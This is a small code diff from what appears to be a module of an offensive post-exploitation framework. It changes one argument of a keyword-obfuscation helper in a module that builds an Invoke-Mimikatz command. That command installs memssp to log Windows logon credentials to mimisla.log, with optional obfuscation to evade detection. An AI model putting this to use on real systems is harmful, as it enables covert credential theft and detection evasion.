@@ -88,7 +88,7 @@ class Module(object):
         scriptEnd = "Invoke-Mimikatz -Command '\"" + command + "\"';"
 
         scriptEnd += '"memssp installed, check C:\Windows\System32\mimisla.log for logon events."'
-        scriptEnd = helpers.keyword_obfuscation(scriptEnd, self.mainMenu)
+        scriptEnd = helpers.keyword_obfuscation(scriptEnd)
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
